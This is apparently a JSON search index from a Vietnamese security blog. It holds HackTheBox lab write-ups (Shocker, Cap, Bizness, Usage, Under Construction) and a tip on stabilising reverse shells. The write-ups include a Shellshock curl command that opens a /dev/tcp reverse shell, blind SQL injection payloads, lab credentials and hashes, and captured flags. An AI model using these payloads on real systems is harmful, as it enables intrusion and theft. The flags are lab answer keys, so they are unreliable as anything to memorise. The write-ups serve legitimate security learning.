[
  
  {
    "title": "Shocker",
    "url": "/posts/shocker/",
    "categories": "HackTheBox, Easy",
    "tags": "HTB, Easy, Shocker",
    "date": "2025-01-07 00:00:00 +0700",
    





    "snippet": "Mô tảNgẫu hứng đêm phia ^^. Vì nay nhức chân không thể chạy bộ theo kế hoạch, chán quá không biết làm gì thôi thì làm một bài easy cho đỡ chán.Lướt mô tả của các bài easy một hồi thì mình quyết định chọn bài này, vì nó làm mình nhớ đến cái bug huyền thoại thời nào.Đây là mô tả của bài lab để bạn biết cụ thể hơn mình đang nói điều gì :)))AttackReconNhư thường lệ, vẫn là nmap.Vẫn là port 80 quen thuộc. Truy cập web thôi.Giao diện web cũng không có gì vui. Như một thói quen thời sinh viên, dirsearch thử xem có thư mục hay file nào hay ho không.Kết quả từ gobuster cũng vọn vẹn nhiêu đây. À há có cgi-bin kìa. Thử dirsearch phát nữa xem có gì hot.Ây da, lòi ra một file .sh.Truy cập vào thì chỉ có bấy nhiêu thông tin =&amp;gt; Hơi thất vọng.Just an uptime test script -&amp;gt; đây có vẻ như là một lệnh nào đó của linux. Đúng rồi đó là lệnh uptime.Exploit ShellshockMà ủa “làm vậy để làm chi ?”, thật sự tới đây mình chưa hiểu được vấn đề ở đây là gì ? Thôi thì tạm để nó qua một bên vậy.Nhớ lại đoạn mô tả của bài lab này có nhắc đến Shellshock exploit. Đây cũng chính là lỗ hổng trong truyền thuyết mà mình đã nhắc ở đầu bài viết. Cứ thử exploit thử xem sao đã.Ngol lụm luôn.Flag 1Flag 1: 94f6590c169a65d3375d01d7b2786046PrivilegesVẫn như thói quen hồi đại học. Cứ hễ nghĩ đến leo quyền là nhanh tay gõ lệnh sudo -l.May thay đây cũng là một lab dạng easy nên có ngay kết quả chưa một binary có thể dùng quyền sudo mà không cần password.Chuyện leo quyền bây giờ trở nên đơn giản hơn rồi. Việc còn lại là viết một payload sử dụng perl call tới /bin/bash như người dùng root là xong.Do là gom chung vào 1 payload khá là khó chẹo nên mình quyết định reverse shell vào user shelly rồi sau đó leo quyền cho dễ.Payload: curl -A &#39;() { :; }; echo; /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.14/2804 0&amp;gt;&amp;amp;1&#39; http://10.129.206.242/cgi-bin/user.sh.Flag 2Flag 2: bb1604537f6b21a35dab9402628b959a."
  },
  
  {
    "title": "Cap",
    "url": "/posts/cap/",
    "categories": "HackTheBox, Easy",
    "tags": "HTB, Cap",
    "date": "2024-12-24 00:00:00 +0700",
    





    "snippet": "Mô tảVào một buổi chiều Noen dự tính về sớm chở bạn người yêu đi chơi nhưng vẫn chưa tới giờ tan ca nên mình nán lại 1 xíu làm nhẹ 1 bài HTB easy.Đây là một số thông tin ít ỏi về mô tả của bài này.AttackReconCũng như thường lệ với các option cũ kĩ, mình vẫn tiếp tục nmap xem ip mà bài lab cung cấp có những dịch vụ nào hot khum.Chúng ta có 3 dịch vụ ftp, ssh, http.Như thường lệ thì mình vẫn vô xem web có gì vui không.Chúng ta có một dashboard. Mà có vẻ web auto login cho mình vào user nathan.Một chức năng có thể down dữ liệu của 1 file pcap nào đó. Tuy nhiên URL của chức năng này có đi kèm id -&amp;gt; để xíu nữa mình bruteforce thử xem.Một chức năng show ipconfig từ server của ứng dụng.Cuối cùng là chức năng hiện thị kết quả của lệnh netstat từ server của ứng dụng.=&amp;gt; Đa phần là những chức năng hiện thị, không có gì hot. Vì thế mình quyết định quay lại bruteforce thử cái id ở chỗ download pcap xem sao.IDORBan đầu tính dùng intruder của burp bruteforce cho lẹ mà không hiểu sao cứ send lại request thì bị redirect về lại dashboard -&amp;gt; ức chế dev luôn cái request cho rồi.Mình cho chạy 100 id lận á mà mới mấy id đầu đã thấy đa số có data rồi nên thôi mình dừng ở đây check thử các file này xem sao đã.Data leak in pcap fileTheo thứ tự trên xuống thôi. Quăng thử file 0.pcap vào wireshare xem có gì hot.Nhìn cũng khá loạn lạc, tuy nhiên vô tình thấy được gói FPT có cái request user gì đó.Connect FTP to get Flag 1Tự nhiên húp được cái tài khoản FTP ngon ơ -&amp;gt; đúng là bài easy kkkkk. nathan:Buck3tH4TF0RM3!.Connect ftp và lụm cái flag thôi.FLAG 1: 9bcc822579143b2d297464daa2579146.SSHNhớ lại ban nãy lúc recon mình còn một dịch vụ SSH. Thử SSH với tài khoản FTP vừa tìm được xem có được hay không.Đôi khi những điều vô tình nó tới thật đúng lúc kkkkk.PrivilegesVì lười qá nên mình sử dụng linpeas.sh để scan xem server có thông tin gì nhạy cảm có thể leo quyền được hay không.linpeas đã được mình copy vào và phân quyền thực thi.Phát hiện ra file binary python3.8 có chứa capability cap_setuid. Cho bạn nào chưa biết thì đây là một capability cho phép chương trình thay đổi UID (User ID). Điều này cho phép chương trình giả dạng thành một người dùng khác.Thế thì mình thử nhẹ một script python cơ bản để thay đổi uid xem như thế nào ?Thật đúng là một bài easy ^-^Cat Flag 2FLAG 2: 853e6653ed9ebe66dfa7f63cfb9d9b1f"
  },
  
  {
    "title": "Nâng cấp raw shell (non-interactive shell) lên TTY shell (pseudo shell)",
    "url": "/posts/TTY-SHELL/",
    "categories": "Tips - Trick",
    "tags": "",
    "date": "2024-11-07 00:00:00 +0700",
    





    "snippet": "Revere shellSau khi get shell thành công mình sẽ sử dụng python để khởi tạo TTY (trong trường hợp server victim không có python thì chịu 😅).python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;Out Reverse shellSau đó Ctrl+Z để suspended lệnh nc(gọi nôm na là đưa lệnh nc vào chế độ chạy nền). Và thoát khỏi shell đang listen. Đứng trên shell local tiếp tục gõ lệnh:stty raw -echo;fgGiải thích một chút thì stty là một command trên linux dùng để cấu hình thiết bị đầu cuối (terminal). Các tuỳ chọn raw, -echo để điều chỉnh cách terminal xử lý đầu vào đầu ra:raw: Chuyển terminal sang chế độ raw shell.-echo: Tắt chế độ echo trên terminal.fg sẽ đưa tiến một tiến trình đang chạy nền trở lại để bạn có thể thao tác trực tiếp với nó, tiến trình đó trong trường hợp này là lệnh nc.Come back Reverse shellSau khi trở lại shell bạn có thể cấu hình thêm cho shell của bạn để dễ thao tác đối với bạn nhất bằng cách khai báo biến môi trường TERM và thêm giá trị cho nó.Đối với mình thì mình chỉ cần nó thêm tí màu mè nữa là ổn. Bạn nào muốn giống mình thì có thêm run thêm command này sau khi trở lại shell trên victim.export TERM=xterm-256colorChúc các bạn phá server của người khác vui vẻ khi custom được shell như ý các bạn mong muốn 🤟🏻🤟🏻🤟🏻"
  },
  
  {
    "title": "Bizness",
    "url": "/posts/bizness/",
    "categories": "HackTheBox, Easy",
    "tags": "HTB, Bizness",
    "date": "2024-10-18 00:00:00 +0700",
    





    "snippet": "Mô tảVẫn như mục tiêu đặt ra mỗi tuần một bài HTB nên hôm nay, trùng hợp là lại vào chiều t6 rãnh rỗi, mình sẽ giải một bài HTB mức easy này.Đọc nhẹ qua machine một xí thì có vẻ cũng khá đơn giản.AttackReconnmapKhai báo domain bizness.htb vào file hosts và truy cập web từ trình duyệt xem có gì húp được hay không.Đây có vẻ như là một site quảng bá cho một doanh nghiệp nào đó.Xem thử nó đang dùng những công nghệ nào ?Nó đang chạy Java với dịch vụ web là Nginx.Chợt nhớ đến phần mô tả về machine ở đầu bài viết này. Nó có nhắc đến CVE-2023-49070. Search và tìm hiểu về CVE này xem có gì vui.Nôm na đây là một lỗ hổng unauthentication to RCE trong Apache Ofbiz trước version 18.12.09.ExploitPOC cũng đã có sẵn ở github sau quá trình search google của mình.Tuy nhiên, ban đầu mình hớn ha hớn hở clone git về và exploit nhưng không thành công 😥😥😥 (hình dưới nó báo vậy thôi chứ netcat của mình vẫn chưa bắt được connect).Không hiểu lý do tại sao, nên chui vào file exploit.py đọc xem ntn (idea của mình lúc ấy là tính attack manual vì không phải lúc nào POC sẵn cũng chạy được).Ờ thì nôm na nó dùng endpoint /webtools/control/ping;/?USERNAME=&amp;amp;PASSWORD=&amp;amp;requirePasswordChange=Y để scan xem website có tồn tại lỗ hổng hay không. Sau đó nó sử dụng ysoserial để tạo payload rồi parse nội dung ra dạng xml và đẩy lên theo đường xmlrpc.Lý do mình exploit không thành công là vì mình đang sử dụng version java 21.0.1 mà tương ứng với lệnh java trong code thì phải là version Java 8. Đối với các version Java 9 trở đi thì mình phải tự add thêm các module thông qua option. Vì vậy nên mình đã thêm vào các option cho command java trong code:--add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens java.base/java.util=ALL-UNNAMEDBây giờ chạy lại và lấy shell thôi.Yeah 🤟🏻🤟🏻🤟🏻 ngon lành.Flag 1 trong tầm tay.Privilege EscalationMay thay vừa get RCE xong mình đứng ngay path của ofbiz luôn.Lục lọi khắp path xem có gì hot hay khum nhé.Source cũng nhiều thứ qá, mình mới đi được những cái tên cảm thấy khả nghi nhưng chưa thấy gì hot ngoài mấy cái user:pass file README.adoc nhưng đó cũng là những account default. Có acc admin:ofbiz cũng là acc default và mình thử login theo đường dẫn admin https://bizness.htb/webtools/control/login nhưng không thành công. Thôi để chạy về nhà rồi mần tiếp sau ………"
  },
  
  {
    "title": "Usage",
    "url": "/posts/usage/",
    "categories": "HackTheBox, Easy",
    "tags": "HTB, Usage",
    "date": "2024-10-11 00:00:00 +0700",
    





    "snippet": "Mô tả🤟🏻🤟🏻🤟🏻 Yeah vào thứ 6 ngày 11 chứ k phải 13 nhé 👻, sau khi hoàn thành công việc được giao ở cty còn chút thời gian buổi chiều mình làm nhẹ một bài HackTheBox, như bạn đã biết và tìm kiếm về nó thì đúng rồi bài HTB này có tên là Usage.Đọc sơ về thông tin machine tôi biết được rằng machine này là một linux server và đang deploy một web site blog có tồn tại lỗ hổng SQL Injection. Và còn nhiều điều thú vị khác như hình bên dưới.AttackStart machine tôi nhận được một IP: 10.129.5.101ReconNhư các thanh niên mới tập tành làm hacker, tôi tiến hành scan nmap để xem ip trên đang chạy những dịch vụ nào.Việc scan nmap trên máy tôi có vẻ khá lâu, trong lúc chờ đợi thử truy cập ip đó vơi port 80 vào trình duyệt thử xem có gì hay ho khum (bản năng của một web application pentester).Tôi bị dì đai déc (redirect) qa domain usage.htb như hình trên. Không lẽ phải khai báo host cho ip đó thì mới có thể truy cập được hay sao ? Thử khai báo thêm host (cho bạn nào chưa biết, các bạn có thể khai báo host tại file /etc/hosts đối với linux, còn windows bạn có thể google thêm nhé, mình qên mất path windows rầu 😅) và truy cập lại xem như thế nào nhé.May quá tôi truy cập được rồi. Cùng lúc đó nmap của tôi cũng đã cho kết quả.Tiến hành scan sâu thêm xíu để lấy thêm một vài thông tin về 2 dịch vụ 22 và 80.Cũng không có gì qá đặc sắc, quay lại vs cái site usage.htb tôi vừa truy cập được.Đi một vòng site đó tôi collect lại các endpoint như sau:GET: /dashboardGET: /loginGET: /registrationGET: /forget-passwordGET: admin.usage.htb/POST: /post-loginPOST: /post-registrationPOST: /forget-passwordFuzzingTừ kinh nghiệm non nớt của một redteam mới vào nghề, tôi sẽ ưu tiên fuzz các lỗ hổng server side trước để nhanh chóng RCE được. Các payload cơ bản của các bug server side đều có sẵn ở seclists.Fuzz qua một vòng tôi đã phát hiện lỗ hổng SQLi ở form forget password. Lười khai thác quá :))) =&amp;gt; SQLMAP cho lẹ thôi 🤣🤣🤣SQL InjectionKết quả SQLmap đã ra như v rồi thì còn nghi ngờ gì nữa mà k attack thẳng luôn ☺️Thêm các option tools gợi ý và xúc thôiỞ đây mình trỏ proxy về burp cho dễ theo dõi payload.Sqlmap chạy khá lâu nên mình đã đi cf một lúc :))). Sau khi cf về thì kết quả cho thấy chúng ta có một SQLi blind với cơ sở dữ liệu là mysqlLại phải trông cậy vào sqlmap để dump db về thôi chứ mình lười khai thác tay hoặc viết tool quá kkkk.Số trời bắt mình phải khai thác bằng tay rồi các bạn ơi. Dump sử dụng cả wordlist nhưng vẫn không thành công.Thôi thì mình sẽ tận dụng lại cái payload mà sqlmap cung cấp để khai thác tiếp bằng tay (manual) vậy.Tổng hợp lại một tí thì đâu là SQLi blind và payload mà sqlmap cung cấp ở dạng error base. Mình paste lại payload để phân tích một tý.&#39; AND EXTRACTVALUE(9050,CASE WHEN (9050=9050) THEN 9050 ELSE 0x3A END) AND &#39;iBUN&#39;=&#39;iBUNNó sử dụng hàm EXTRACTVALUE, đây là một hàm trong hầu hết cơ sở dữ liệu mà cụ thể ở đây là mysql. Nó dùng để lấy dự liệu từ một tài liệu XML với 2 tham số đầu vào.Tham số đầu tiên thường sẽ là một tài liệu XML hoặc là một số bất kỳ nào đó.Tham số thứ 2 sẽ là XPATH trỏ đến tài liệu đó.Trong payload này 2 tham số lần lượt sẽ là 9050 và CASE WHEN (9050=9050) THEN 9050 ELSE 0x3A END)Mình sẽ phân tích vào tham số thứ 2 nhé. Đây là một biểu thức điều kiện, nếu 9050=9050 =&amp;gt; luôn đúng thì sẽ trả về 9050 ngược lại sẽ trả về 0x3A là mã hex của :.Bỏ vào burp thử chúng ta sẽ nhận ra rằng trong trường hợp đúng response sẽ có mã 302 ngược lại sẽ là 500.OK. Bây giờ sẽ edit lại payload để get version thử nhé. Trước tiên mình sẽ tìm độ dài của version sẽ có bao nhiêu ký tự và payload tìm độ dài như sau:&#39; AND EXTRACTVALUE(9050,CASE WHEN ((select length(@@version))&amp;gt;20) THEN 9050 ELSE 0x3A END) AND &#39;iBUN&#39;=&#39;iBUNKết quả của payload trên trả về 302 có nghĩa là đúng, độ dài của version mysql lớn hơn 20 ký tự. Tiếp tục fuzz đến khi nào ra độ dài chính xác thì thôi. =&amp;gt; độ dài chính xác là 23Mục tiêu chính của mình đâu phải chỉ tìm version đâu đúng k ? Cho nên việc xác định độ dài chỉ để chứng minh rằng idea sửa payload của mình thành công. Tiếp tục với idea đó mình sẽ đi tìm tất cả các table có trong db mysql.Với payload dưới đây mình sẽ sử dụng intruder của burp để bruteforce từng ký tự với độ dài 371 cho mỗi vị trí của các table có trong db mysql. Payload: ` AND EXTRACTVALUE(9050,CASE WHEN ((select substr(group_concat(table_name),1,1) from information_schema.tables WHERE table_schema != ‘information_schema’)=’g’) THEN 9050 ELSE 0x3A END) AND ‘iBUN’=’iBUN`.Ngol lành, sếp xếp lại 1 tý để có full table thôi nào.Và đây là danh sách table có trong db mysql mà mình vừa dump được.global_status,global_variables,persisted_variables,processlist,session_account_connect_attrs,session_status,session_variables,variables_info,admin_menu,admin_operation_log,admin_permissions,admin_role_menu,admin_role_permissions,admin_role_users,admin_roles,admin_user_permissions,admin_users,blog,failed_jobs,migrations,password_reset_tokens,personal_access_tokens,usersTừ đây mình sẽ focus vào 2 table admin_user và users đầu tiên đến xem húp được gì không. Tiếp tục tìm column và dump data 2 table đó.  Column name table users: id,name,email,email_verified_at,password,remember_token,created_at,updated_atColumn name table admin_users: Id,username,password,name,avatar,remember_token,created_at,updated_atBảng admin_users chỉ có đúng một dòng với user,pass: admin:$2y$10$ohq2klpbh/ri.p5wr0p3uomc24ydvl9da9h1s6ooomgh5xvfuprl2Đã có pass dạng hash, mình k biết đây là dạng mã hoá nào. Thôi thử cứ để hashcat detect xem sao. Nhưng trước tiên tôi sẽ thử với các công cụ online trước.Công cụ crack online bảo mình rằng đây là một bcrypt nhưng nó k crack được. Thôi thì mình sẽ thử với công cụ thần thánh hashcat xem sao.Sau gần 3 tiếng ngồi crack bằng hashcat nhưng vẫn không nhận được kết quả, mình chuyển sang hướng tim các user thường xem có idea gì mới không.Quay lại với bảng users.  Đã tìm được thông tin các user trong bảng usersraj@raj.com:$2y$10$7almtteyfrvd8rnyep/ck.bsfkfxfsltplkyqqsp/tt7x1wapjt4.raj@usage.htb:$2y$10$rbncgxpwp1hspo1gqx4upo.pdg1nszoi/uhwhvfhddfdfo9vmdjsaa@gmail.com:$2y$10$40rwm43ejd7p04jgtvdm7exuw1ygu7thg5r6bwmtwgmkiegpg.zayb@gmail.com:$2y$10$nctkiwzoakyk0jhvstkhfonm6qvoeoodklb8ymisv69bwhgsyjko6Ngoại trừ 2 account a và b mình tạo ra thì còn lại 2 account raj@raj.com và raj@usage.htb. Thử crack bcrypt của nó xem như thế nào ?Hashcat chạy quá lâu, mà mình quên mất ngoài hashcat ra thì vẫn còn john ripper thần thánh. Chuyển qua sử dụng john xem có tiến triển gì hơn khum.Trời thật không phụ lòng người, cuối cùng cũng crack được pass admin. Login tìm đường RCE thôi nào !!!!Ngol lành luôn.Sau khi đi 1 vòng tất cả các chứng năng sau khi login. Thì chỉ có form tạo hoặc sửa user là có chức năng upload =&amp;gt; có khả năng lên shell.Tuy nhiên đời k như là mơ. Chức năng có cũng như không. API thì chạy nhưng user lại k được tạo ra. ĐI theo avatar của user admin để tìm nơi chứa hình ảnh đã up để trigger shell nhưng cũng k được. =&amp;gt; Quay xe thôi.Quay lại quá trình recon web ban đầu. Mình vẫn còn các version chưa biết cũ mới. Đầu tiên là nginx 1.18.0Khả năng cao là có CVE vì mình nghi đây chưa phải version latest. Google xíu nào.POC các thứ 1 hồi vẫn k ăn thua =&amp;gt; Lại quay xe tìm được khác thôi.Như hình trên thì version của PHP vs Laravel chưa được list ra. À há hình như khi login vào dashboard nó được hiện thị.PHP 8.1.2 có vẻ khá to. Thôi thử tìm Laravel xem s, nhìn ver nhỏ hơn nhiều so với latest.Nó đây rồi, thử xem POC được khum nha.Lại khó rồi mình thiếu file .log của laravel nên khó mà POC được. Thôi thì bung js ra đọc thôi.Vì endpoint mình cũng đã đi hết rồi, tìm version POC CVE thì cũng vậy. =&amp;gt; Việc đọc js để tìm gì nhỉ ? kkkkk tất nhiên là sẽ tìm những endpoint hoặc version ẩn nào đó. Ắt hẳn là các bạn đang thắc mắc version ẩn là gì đúng không. Vì đây là CMS Laravel nó na ná như Wordpress vậy á nên việc quản trị viên sử dụng thêm các plugin thứ 3 là có thể có.Search keyword version thì có 3 kết quả.2 kết quả đầu đã được hiện thị ở dashboard rồi. Vậy còn kết quả thứ 3 là gì nhỉ ?Version 1.8.17 nhưng của cái gì thì mình cũng k rõ chỉ đoán đây là 1 plugin nào đó của Laravel. Không biết thì google thôi chứ dì đou mà ngại kkkkNgồi google một lúc lâu mới phát hiện version 1.8.17 này là của laravel-admin. May thay mình đi lòng vòng trên không gian mạng thì lòi ra được cái site nói về CVE của laravel-admin này. Nó lại còn có ví dụ ik chang cái site mình đang attack nữa chứ.Á đù nó chính là cái chức năng upload mà hồi nãy mình đã attack nhưng nghĩ nó k work. Làm theo sách giao khoa không up shell được thì bây giờ mình thử làm theo cuốn chân kinh mình mới tìm được xem sao nhỉ.Yeah cuối cùng cũng lên được con shell ghẻ kkkk.  Loay hoay 1 hồi vào đọc chân kinh mới ngộ ra rằng. Cái chức năng upload ở function tạo user k work thiệt. Mà phải sử dụng chức năng upload ở function edit user admin.Khi lên được shell thì việc lấy flag đầu tiên ez rồi.Privilege EscalationHình như khu vực nơi chứa file upload của admin đang được chạy 1 script auto tạo lại file avatar của admin. Nên cứ up web shell lên chưa được 10p thì web shell của mình bị xoá và trở lại là hình avatar của admin. Hơi khó chẹo nên mình quyết định sẽ up một con reverse shell vào thư mục /tmp.OK, có revershell thành công. Nhưng con reverseshell này vẫn còn khó chẹo, mình k thể sudo hay làm 1 vài thao tác nâng cao. Nên chắc mình sẽ tìm cách get đúng shell của user dash trước khi leo quyền.Idea cơ bản nhất là mình sẽ tìm cách lấy key ssh vì hồi lúc recon mình nhớ vẫn còn port 22 chưa đụng đến.Yeah đi vào profile user và thư mục mặc định của ssh là sẽ thấy thôi. (/home/user/.ssh/).Yeah ngol lành, bắt cái thang lên leo thôi.Gần như các kỹ thuật leo quyền cơ bản đều không khả dụng trong trường hợp này.Yeah các binary dưới đây đang được chạy với quyền root. Tìm cách húp nó thôi.Mình sẽ focus vào các binary trong nhóm /usr/bin trước. Mình nghĩ đa số các binary này đã từng có ít nhất 1 CVE nào đó. Thôi thì mình sẽ check version của từng binary rồi so với các CVE của chúng thử xem có thể khai thác cái nào hay k nhé.Đi một vòng thì mình phát hiện ra thằng pkexec có vẻ phù hợp và cũng có sẵn POC trên git luôn. Chờ dì nữa mà k thử exploit.Tưởng dễ ăn nhưng vẫn k ăn được. Lại phải quay xe. Chợt nhớ ra tôi chưa kiểm tra xem internal có đang mở port nào có thể tunnel ra ngoài được khum nhỉ ?Vẫn không tìm thấy gì hot haizzz. Quằng quá bỏ đi chơi ……Sau khi đi chơi về mình lại tiếp tục connect vào ssh và đi lòng vòng xem có gì hot để khai thác không. Lần này mình mò lòng vòng trong src web lẫn profile user. Mặc dù mang tiếng là dùng linux nhiều hơn dùng win nhưng nhìn vào profile user vẫn có nhiều file mình không thể hiểu được.Mình thắc mắc các file như .lesshst, monit* là gì nhỉ ? Không hiểu thì hỏi thôi, đem lên google hỏi nào.Thì ra file .lesshst là file lịch sử được tạo ra bởi lệnh less.Còn các file .monit* là do server đang chạy một dịch vụ monitor (giám sát) mã nguồn mở. Nó được sử dụng để theo dõi và quản lý các dịch vụ, tiến trình, và tài nguyên hệ thống trên các hệ điều hành giống Unix. Google sâu về dịch vụ này thì mình thấy thông thường nó sẽ open một port 2812 để quản trị viên có thể dễ dàng quản trị server từ xa thông qua trình duyệt. Thế thì ngại gì mà k thử truy cập vào port đó xem ntn nhỉ.Lười mở trình duyệt qá nên mình dùng curl luôn. Nó kêu mình k có quyền. Mình đang đứng ở server chạy nó mà nó dám làm khó mình. Đọc thử các file monit* xem có gì hot nào.Ối có tài khoản admin kìa.Hmmm, trình duyệt thì k dùng được thế thì tài khoản này dùng để làm gì cà ? Mình vẫn còn tài khoản xander và root chưa login được. Nhưng tài khoản dash mình vẫn chưa có password. Thử hết cả 3 tài khoản xem ntn.Nó là thằng xander. Thằng này có dì nhỉ. Lại mò profile nó thôi kkkkkMặc dù biết là k được đâu nhưng vẫn cố chấp xem ntn kkkkLeo root đã trở nên dễ dàng hơn khi bạn có password và chạy được lệnh sudo -l 🤣🤣🤣Nó là một file binary do quản trị dev. Hmm k lẽ RE file này để đọc code nó ta 🤔. Thử strings nó ra trước xem có chuỗi j hay ho k đã.Hên quá cũng có nội dung mình cần. Option 1 thì nó dùng 7za để nén file như mình đã tô trắng trên hình. Option 2 thì nó dùng mysqldump để dump file .sql cách đó 2 dòng.Nhìn vào 3 dòng này mình đoán là khi chạy option 1 nó sẽ nén thư mục /var/www/html thành file /var/backups/project.zip.Điều mình quan tâm ở đây là dấu wildcard *. Nó sẽ thêm tất cả các thư mục hoặc file ở thư mục hiện tại vào file zip. Vậy giả sử thư mục hiện tại chính là thư mục /root thì sẽ như thế nào nhỉ ?Idea ở đây là mình sẽ sử dụng một symbol link trỏ từ /root đến /var/www/html.Việc còn lại là mình giải nén file zip đó ra là sẽ lấy được flag bên trong thư mục /rootNhưng chuyện không dễ đến thế mình lại k có quyền giải nén nó. Hmmm quay lại đọc hướng dẫn sử dụng của 7za vậy.Yeah ✌🏻✌🏻✌🏻 thành công. Done.Kết luậnFlag 1ba52a4d7c85dc89d0e3433fdfc8d2f58Flag 2328080f50550138cc4d1cfeddabf81ac"
  },
  
  {
    "title": "Under Construction",
    "url": "/posts/under-construction/",
    "categories": "HackTheBox, Easy",
    "tags": "HTB, Under_Construction",
    "date": "2022-02-02 00:00:00 +0700",
    





    "snippet": "HTB-Under-ConstructionVào dịp cuối năm trong lúc mọi người đang bận rộn dọn dẹp nhà cửa, sắp sửa đồ mới đón tết thì mình nhận được một challenge HackTheBox ở mức medium từ một người anh vừa mới quen qua một nhóm học tập trên facebook.Challenge này cho mình hẳn source web, sau khi tải source về và wow NodeJs, mình mù tịt với ngôn ngữ này :((. Đi sơ qua một vòng mình thấy có 2 file JWWTHelper.js và DBHelper.js làm mình nghĩ đến JWT attack và SQL injection. Đọc qua file DBHelper.js thấy được các câu truy vấn không được lọc kĩ càng gì cả. Nhưng mình lại chưa biết làm thế nào để có thể inject vào các câu truy vấn đó được. Thôi thì quay qua đọc file JWTHelper.js xem như thế nào.Có vẻ như là public key được lồng ở trong token của user (mình đoán vậy kkkk). Để chắc chắn cho suy đoán của mình thì mình đã đăng ký một user và đăng nhập với user vừa tạo để lấy giá trị session đem lên JWT.io kiểm chứng.Bởi vì có public key nên mình nghĩ chắc chắn phải có gì đó liên quan đến authen. Thử google một vòng với từ khoá JWT authen attack. Mình phát hiện được hacktricks có viết về kĩ thuật thay đổi thuật toán từ RS256 sang HS256. Check lại thuật toán JWT ở challenge này thì tình cờ thấy nó dùng thuật toán HS256. Google theo kĩ thuật này mình đã được thông não.Do thuật toán HS256 sử dụng khoá bí mật để đánh dấu và xác thực mỗi message, còn thuật toán RS256 thì sử dụng private key để đánh dấu message và public key để xác thực athen. Vì vậy, nếu thay đổi từ thuật toán RS256 sang HS256 thì public key sẽ được sử dụng như khoá bí mật và khi đó thuật toán HS256 dùng để xác thực chữ ký.Sau khi thực hiện theo các bước ở site trên mình đã tạo ra được một token mới với thuật toán HS256 và user admin. Tiến hành inject token mới để bypass authen thì mình lại nhận được một kết quả khá là hụt hẫn với thông tin là user admin không tồn tại :((((.Trong message ở hình trên có nhắc đến database mình nghĩ ngay đến file DBHelper.js lúc nãy. Trong file mình thấy có hàm checkUser. Mình đoán kiểu gì khi login hàm này cũng được gọi ra.Với kinh nghiệm đã từng dev web laravel mình check thử một vòng trong thư mục routes. Cuối cùng mình cũng đã tìm được route login.Khi login hàm checkUser sẽ được gọi ra và truy vấn xuống database. Input truyền vào chính là username nằm trong phần data của token.Mình cũng không rõ lắm về cú pháp của sqlite nên mình chèn đại cú pháp union của mysql xem kết quả trả về như thế nào :))).Wow chính nó, chính là sql injection đây mà. Do không rành về cú pháp sqlite nên mình google dùng một vài payload trên git.Thả nhẹ payload Extract table name thì mình có được table flag_storageHy vọng flag nằm trong table này. Minh tiếp tục lấy cột trong table và nội dung của cột chứa flag.Đem flag vừa tìm lên HTB submit  thành công.POCCám ơn các bạn đã ghé qua đây :))))"
  }
  
]

